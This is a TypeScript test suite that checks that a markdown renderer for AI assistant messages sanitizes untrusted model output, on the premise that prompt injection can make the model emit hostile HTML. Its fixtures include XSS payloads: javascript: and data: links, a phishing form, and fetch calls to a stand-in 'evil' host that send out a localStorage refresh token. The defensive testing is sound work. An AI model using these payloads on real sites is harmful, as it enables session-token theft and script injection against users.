/**
 * Security tests for the assistant-message markdown pipeline.
 *
 * Model output is untrusted (prompt injection via archival notes, uploaded
 * documents, shared prompts), so these tests treat `renderMarkdown` as the
 * trust boundary: nothing executable may come out, and the features the UI
 * relies on (toolbars, chart containers, tables, links) must survive.
 */

import { describe, it, expect } from 'vitest';
import { renderMarkdown } from './markdown';

function dom(md: string): HTMLElement {
	const el = document.createElement('div');
	el.innerHTML = renderMarkdown(md);
	return el;
}

/** Every attribute on every element, flattened to "name=value". */
function allAttrs(root: HTMLElement): string[] {
	return Array.from(root.querySelectorAll('*')).flatMap(el =>
		Array.from(el.attributes).map(a => `${a.name}=${a.value}`),
	);
}

function hasEventHandler(root: HTMLElement): boolean {
	return allAttrs(root).some(a => /^on[a-z]+=/i.test(a));
}

// ── Raw HTML in markdown ────────────────────────────────────────────────────

describe('raw HTML from the model is sanitized', () => {
	it('drops <script>', () => {
		const el = dom('hello <script>window.pwned = 1</script> world');
		expect(el.querySelector('script')).toBeNull();
		expect(el.textContent).not.toContain('pwned');
	});

	it('drops inline event handlers on any element', () => {
		const el = dom('<div onclick="alert(1)" onmouseover="alert(2)">x</div>');
		expect(hasEventHandler(el)).toBe(false);
		expect(el.textContent).toContain('x');
	});

	it('drops <img> entirely (remote images are zero-click exfiltration)', () => {
		const el = dom('<img src="x" onerror="fetch(\'https://evil/?t=\'+localStorage.asap_refresh_token)">');
		expect(el.querySelector('img')).toBeNull();
		expect(hasEventHandler(el)).toBe(false);
	});

	it('drops markdown image syntax too', () => {
		const el = dom('![tracker](https://evil.example/pixel.gif)');
		expect(el.querySelector('img')).toBeNull();
	});

	it('drops iframes, objects, embeds, forms and inputs', () => {
		const el = dom(
			'<iframe src="https://evil"></iframe><object data="x"></object><embed src="x">' +
			'<form action="https://evil"><input name="password"><button>Login</button></form>',
		);
		for (const tag of ['iframe', 'object', 'embed', 'form', 'input']) {
			expect(el.querySelector(tag), tag).toBeNull();
		}
	});

	it('drops <style> and <math>', () => {
		const el = dom('<style>body{display:none}</style><math><mi>x</mi></math>');
		expect(el.querySelector('style')).toBeNull();
		expect(el.querySelector('math')).toBeNull();
	});

	it('strips scripts and handlers from inline SVG but keeps the shape', () => {
		const el = dom('<svg onload="alert(1)"><script>alert(2)</script><circle r="1"/></svg>');
		expect(el.querySelector('script')).toBeNull();
		expect(hasEventHandler(el)).toBe(false);
	});

	it('drops inline style attributes (overlay phishing, CSS url() beacons)', () => {
		const el = dom('<div style="position:fixed;inset:0;background:url(https://evil/b)">Log in again</div>');
		expect(el.querySelector('[style]')).toBeNull();
		expect(el.textContent).toContain('Log in again');
	});

	it('demotes SVG anchors to text even with an https href', () => {
		const el = dom('<svg><a href="https://evil.example"><text>x</text></a></svg>');
		expect(el.querySelector('a[href]')).toBeNull();
	});

	it('drops <svg><a xlink:href="javascript:…">', () => {
		const el = dom('<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>');
		expect(allAttrs(el).some(a => /javascript:/i.test(a))).toBe(false);
	});

	it('does not preserve DOM-clobbering ids/names', () => {
		const el = dom('<a id="location" name="cookie">x</a>');
		expect(el.querySelector('[id="location"]')).toBeNull();
		expect(el.querySelector('[name="cookie"]')).toBeNull();
	});
});

// ── Link URL policy ─────────────────────────────────────────────────────────

describe('link URLs', () => {
	it('keeps http(s) and mailto links and forces a safe target', () => {
		const el = dom('[a](https://archives.example/repositories/2) [b](http://x.example) [c](mailto:me@example.org)');
		const links = el.querySelectorAll('a[href]');
		expect(links).toHaveLength(3);
		links.forEach(a => {
			expect(a.getAttribute('target')).toBe('_blank');
			expect(a.getAttribute('rel')).toBe('noopener noreferrer');
		});
	});

	it.each([
		'javascript:alert(1)',
		'JaVaScRiPt:alert(1)',
		'java\tscript:alert(1)',
		'data:text/html,<script>alert(1)</script>',
		'vbscript:msgbox(1)',
		'blob:https://app.example/uuid',
		'/api/users/me',          // relative paths must not point back at our own API
		'//evil.example/x',       // protocol-relative
	])('removes href %s', href => {
		const el = dom(`<a href="${href}">click</a>`);
		expect(el.querySelector('a[href]')).toBeNull();
		expect(el.textContent).toContain('click');
	});

	it('removes javascript: from markdown link syntax', () => {
		const el = dom('[click](javascript:alert(1))');
		expect(allAttrs(el).some(a => /javascript:/i.test(a))).toBe(false);
	});
});

// ── Fenced code: language attribute injection ───────────────────────────────

describe('fenced code language string', () => {
	it('cannot inject attributes via the fence info string', () => {
		const md = '```js" onpointerenter="fetch(\'https://evil/?t=\'+localStorage.asap_refresh_token)\nconsole.log(1)\n```';
		const el = dom(md);
		expect(hasEventHandler(el)).toBe(false);
		const code = el.querySelector('pre code');
		expect(code).not.toBeNull();
		// Only the first whitespace-delimited word is used for the class.
		expect(code!.getAttribute('class')).toBe('language-js"');
	});

	it('uses only the first word of the info string', () => {
		const el = dom('```python title=foo.py\nx = 1\n```');
		expect(el.querySelector('pre code')!.getAttribute('class')).toBe('language-python');
	});

	it('escapes code content', () => {
		const el = dom('```html\n<script>alert(1)</script>\n```');
		expect(el.querySelector('script')).toBeNull();
		expect(el.querySelector('pre code')!.textContent).toBe('<script>alert(1)</script>');
	});
});

// ── Features that must survive sanitization ─────────────────────────────────

describe('legitimate output is preserved', () => {
	it('renders basic GFM', () => {
		const el = dom('# Title\n\nSome **bold** and _em_ text.\n\n- one\n- two\n\n> quote');
		expect(el.querySelector('h1')!.textContent).toBe('Title');
		expect(el.querySelector('strong')!.textContent).toBe('bold');
		expect(el.querySelectorAll('li')).toHaveLength(2);
		expect(el.querySelector('blockquote')).not.toBeNull();
	});

	it('keeps the copy button on code blocks', () => {
		const el = dom('```sql\nSELECT 1\n```');
		const wrapper = el.querySelector('.code-block-wrapper');
		expect(wrapper).not.toBeNull();
		const btn = wrapper!.querySelector('button.copy-code-btn');
		expect(btn).not.toBeNull();
		expect(btn!.getAttribute('aria-label')).toBe('Copy code');
		expect(btn!.querySelector('svg path')).not.toBeNull();
		expect(wrapper!.querySelector('pre code')!.textContent).toBe('SELECT 1');
	});

	it('keeps the attributes the toolbar icons need to render', () => {
		// Regression: a scheme-only ALLOWED_URI_REGEXP once stripped every
		// non-URL attribute, leaving 300x150 unstyled SVGs in place of icons.
		const el = dom('```sql\nSELECT 1\n```\n\n| a |\n|---|\n| 1 |');
		for (const svg of Array.from(el.querySelectorAll('button svg'))) {
			expect(svg.getAttribute('width')).toMatch(/^\d+$/);
			expect(svg.getAttribute('height')).toMatch(/^\d+$/);
			expect(svg.getAttribute('viewBox')).toBe('0 0 24 24');
			expect(svg.getAttribute('stroke')).toBe('currentColor');
			expect(svg.getAttribute('fill')).toBe('none');
			expect(svg.getAttribute('stroke-width')).toBe('2.5');
		}
		const path = el.querySelector('button svg path')!;
		expect(path.getAttribute('d')).toMatch(/^M/);
		const rect = el.querySelector('button svg rect')!;
		expect(rect.getAttribute('x')).toBe('9');
		expect(el.querySelectorAll('button svg').length).toBeGreaterThanOrEqual(3);
	});

	it('keeps the attributes the Vega toolbar needs', () => {
		const spec = '{"mark":"bar","data":{"values":[{"a":1}]},"encoding":{"x":{"field":"a"}}}';
		const el = dom('```vega-lite\n' + spec + '\n```');
		const svgs = el.querySelectorAll('.vega-btns svg');
		expect(svgs).toHaveLength(4);
		svgs.forEach(svg => expect(svg.getAttribute('width')).toMatch(/^\d+$/));
		expect(Array.from(el.querySelectorAll('.vega-btns button span')).map(s => s.textContent))
			.toEqual(['CSV', 'SVG', 'PNG', 'Spec']);
	});

	it('keeps the table export toolbar', () => {
		const el = dom('| a | b |\n|---|---|\n| 1 | 2 |');
		const wrapper = el.querySelector('.table-export-wrapper');
		expect(wrapper).not.toBeNull();
		expect(wrapper!.querySelector('button.copy-table-btn')).not.toBeNull();
		expect(wrapper!.querySelector('button.export-csv-btn')).not.toBeNull();
		expect(wrapper!.querySelectorAll('td')).toHaveLength(2);
	});

	it('turns a vega-lite fence into a chart container with hidden spec', () => {
		const spec = JSON.stringify({
			$schema: 'https://vega.github.io/schema/vega-lite/v6.json',
			mark: 'bar',
			data: { values: [{ a: 'x', b: 1 }] },
			encoding: { x: { field: 'a' }, y: { field: 'b' } },
		});
		const el = dom('```vega-lite\n' + spec + '\n```');
		const block = el.querySelector('.vega-block');
		expect(block).not.toBeNull();
		const chart = block!.querySelector('.vega-chart');
		expect(chart!.getAttribute('aria-busy')).toBe('true');
		const specEl = block!.querySelector('.vega-spec') as HTMLElement;
		expect(specEl.hasAttribute('hidden')).toBe(true);
		expect(block!.querySelector('.vega-spec-btn')!.getAttribute('aria-expanded')).toBe('false');
		// The spec text round-trips so embedChart can re-read it.
		expect(JSON.parse(specEl.querySelector('code')!.textContent!)).toMatchObject({ mark: 'bar' });
	});

	it('styles [Passage N] citations as chips', () => {
		const el = dom('As stated [Passage 3], the fonds…');
		const chip = el.querySelector('span.passage-cite');
		expect(chip!.textContent).toBe('Passage 3');
	});

	it('does not let the citation regex be abused for injection', () => {
		const el = dom('[Passage <script>alert(1)</script>]');
		expect(el.querySelector('script')).toBeNull();
		expect(el.querySelector('span.passage-cite')).toBeNull();
	});

	it('tolerates partial (streaming) input', () => {
		expect(() => renderMarkdown('```vega-lite\n{"mark": "bar", "data": {')).not.toThrow();
		expect(() => renderMarkdown('| a | b\n|---')).not.toThrow();
		expect(() => renderMarkdown('<div><span')).not.toThrow();
		expect(renderMarkdown('')).toBe('');
	});
});
